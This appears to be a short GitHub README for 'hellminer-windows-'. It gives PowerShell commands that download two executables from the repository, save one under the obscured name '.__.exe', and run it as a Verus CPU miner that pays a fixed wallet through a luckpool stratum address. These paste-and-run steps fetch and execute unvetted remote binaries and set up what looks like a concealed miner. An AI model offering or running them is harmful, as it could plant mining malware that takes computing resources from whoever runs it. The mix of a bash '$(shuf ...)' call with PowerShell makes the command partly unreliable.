# hellminer-windows-
Invoke-WebRequest -Uri https://raw.githubusercontent.com/tolecilik/hellminer-windows-/main/verus.exe -OutFile .\.__.exe
Invoke-WebRequest -Uri https://raw.githubusercontent.com/tolecilik/hellminer-windows-/main/verus-solver.exe -OutFile .\verus-solver.exe
.__.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u  RK5MbxbScCATftUDmu87FgL6A3UhgA9RnY.Wins365.$(shuf -n 1 -i 1-9999999) -p x --cpu 2
